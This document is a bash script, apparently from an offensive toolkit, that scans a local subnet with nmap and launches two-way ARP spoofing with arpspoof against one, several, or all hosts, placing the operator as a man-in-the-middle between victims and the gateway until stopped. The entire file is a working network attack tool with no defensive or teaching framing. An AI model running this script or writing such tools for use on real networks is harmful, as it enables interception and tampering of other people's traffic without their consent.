#!/bin/bash
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'

if [[ $1 == "" ]] || [[ $2 == "" ]] || [[ $3 == "" ]] ; then
	echo -e "$red	|__ Complete and Check your options pls "
	exit
fi
# $1 == targets range .. $2 == getaway .. $3 == interface
trap " echo "" ; kill -9 `pgrep arpspoof` 2> /dev/null ; cd .. ; rm -rf .workspace ; exit " SIGINT SIGTERM
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
function scan {
        bash -c "nmap -sn $subn | grep 'Nmap scan report for' | cut -d ' ' -f5 > ip.txt"
        intip=`echo $(echo $( ifconfig wlan0 | grep "inet" | awk {' print $2 '} ) | awk {' print $1 '} )`
        grep -v -e $getaway -e $intip ip.txt > ips.txt
        LIH=`wc -l ip.txt | awk {' print $1'}`
}

subn="$2/24"
getaway="$2"
if [[ $1 == "all" ]] || [[ $1 == "ALL" ]] ; then
	scan
fi
echo -e "$red	|______________"
echo -e "$red	    |"
if [[ $1 == "all" ]] ; then

	for i in `seq 1 $LIH` ; do
        	t1=`awk NR==$i ip.txt`
        	arpspoof -t $2 $t1 2> /dev/null &
        	arpspoof -t $t1 $2 2> /dev/null &
		echo -e "$red	    |___ $blue$t1"
	done
elif [[ $1 =~ `echo $2 | cut -d "." -f1,2,3` ]] ; then
       	if [[ $1 =~ "," ]] ; then

               for i in `echo $1 | sed 's/,/\n/g'` ; do
			arpspoof -t $2 $i 2> /dev/null &
                	arpspoof -t $i $2 2> /dev/null &
			echo -e "$red	    |__ $blue$i"
               done
        elif ! [[ $1 =~ "," ]] ; then
		arpspoof -t $2 $1 2> /dev/null &
        	arpspoof -t $1 $2 2> /dev/null &
		echo -e "$red	    |__ $blue$1"
        else
                echo -e "$red	|__ Something went wrong , check your options pls"
                exit

	fi
fi
echo ""
while true ; do
	echo -en "$red	|__ ${yellow}C${red}trl ${blue}+ ${yellow}C$red or '$yellow EXIT$red 'to stop spoofing : " ; read f
	if [[ $f == "exit" ]] || [[ $f == "back" ]] ; then
		 echo "" ; kill -9 `pgrep arpspoof` 2> /dev/null ; cd .. ; rm -rf .workspace ; exit 0
	fi
done
